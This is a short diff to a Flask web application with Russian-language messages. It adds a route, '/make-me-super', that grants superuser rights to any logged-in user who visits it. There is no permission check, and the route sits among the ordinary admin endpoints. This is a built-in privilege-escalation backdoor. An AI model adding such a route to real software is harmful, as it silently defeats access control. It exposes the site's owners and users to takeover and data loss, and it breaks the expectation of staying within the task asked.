@@ -2056,6 +2056,12 @@ def api_import_quick_sample():
     
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+@app.route('/make-me-super')
+@login_required
+def make_me_super():
+    current_user.is_superuser = True
+    db.session.commit()
+    return 'Готово — ты суперюзер'
 @app.route('/admin/clean-dupes')
 @login_required
 def admin_clean_dupes():
@@ -2070,6 +2076,7 @@ def admin_clean_dupes():
             deleted += 1
     db.session.commit()
     return f'Удалено {deleted} дублей'
+
 @app.route('/admin/import')
 @login_required
 def admin_import():
